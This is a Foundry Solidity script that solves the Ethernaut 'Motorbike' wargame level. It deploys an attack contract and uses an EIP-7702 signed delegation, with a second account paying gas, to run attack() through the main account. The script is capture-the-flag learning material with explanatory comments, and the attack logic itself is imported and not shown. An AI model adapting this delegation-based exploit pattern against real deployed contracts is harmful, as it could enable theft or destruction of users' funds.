// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Vm} from "forge-std/Vm.sol";
//import {console} from "forge-std/console.sol";
import {MotorbikeAttack7702} from "../src/MotorbikeAttack7702.sol";

contract Solve is Script {
    address constant ETHERNAUT_ADDRESS = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;

    function run() external {

        uint256 mainPrivateKey = vm.envUint("MAIN_PRIVATE_KEY");
        uint256 secPrivateKey = vm.envUint("SEC_PRIVATE_KEY");
        address mainEoa = vm.addr(mainPrivateKey);

        // Deploy the contract that will serve as the temporary implementation for our main EOA
        vm.broadcast(mainPrivateKey);
        MotorbikeAttack7702 attack = new MotorbikeAttack7702();

        // --- EIP-7702 Step 1: Create the Authorization ---
        // The main EOA (authorizer) signs an authorization message.
        // This signature grants the 'attack' contract the authority to execute code on behalf of 'mainEoa'.
        // This doesn't send a transaction; it just creates a signed payload.
        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(attack), mainPrivateKey);

        // Switch the transaction broadcaster to the secondary account.
        // This secondary EOA account will pay the gas for the delegated transaction.
        vm.broadcast(secPrivateKey);

        // --- EIP-7702 Step 2: Attach the Authorization ---
        // The secondary EOA (invoker) includes the signed authorization from the main EOA in its next transaction.
        // This tells the EVM to use the authorization for the upcoming call.      
        vm.attachDelegation(signedDelegation);

        // --- EIP-7702 Step 3: Execute the Delegated Call ---
        // The transaction is sent to the 'mainEoa' address.
        // Because of the attached delegation, the EVM executes the code from the 'attack' contract
        // *as if* it were deployed at the 'mainEoa' address.
        // Inside the 'attack()' function, msg.sender will be 'mainEoa', not the secondary address.
        // The secondary account only acts as the transaction initiator and gas payer.
        MotorbikeAttack7702(mainEoa).attack();
    }
}
